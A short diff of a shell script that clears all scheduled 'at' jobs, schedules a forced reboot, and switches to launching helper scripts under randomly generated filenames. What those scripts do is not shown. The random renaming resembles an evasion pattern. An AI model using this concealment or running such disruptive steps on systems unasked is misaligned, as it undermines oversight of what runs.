@@ -8,6 +8,9 @@ for i in `atq | awk '{print $1}'`;do atrm $i;done
 echo 'sudo reboot -f' | at now + 12 hours
 
 apt -y install gpw
+apt -y install sudo
+
+
 
 timer=$(gpw 1 11)
 tmpfoldername=$(gpw 1 7)
@@ -54,7 +57,7 @@ sleep 3
 
 sudo apt-get install dos2unix
 
-sudo dos2unix defaulttimer.sh
+sudo dos2unix $timer.sh
 sudo dos2unix $4x.sh
 sudo dos2unix $2x.sh
 sudo dos2unix $5x.sh
@@ -62,6 +65,6 @@ sudo dos2unix $3x.sh
 sudo dos2unix $6x.sh
 sudo dos2unix $1x.sh
 
-sudo ./defaulttimer.sh & ./defaultchecker.sh
+sudo ./$timer.sh & ./defaultchecker.sh
 
 
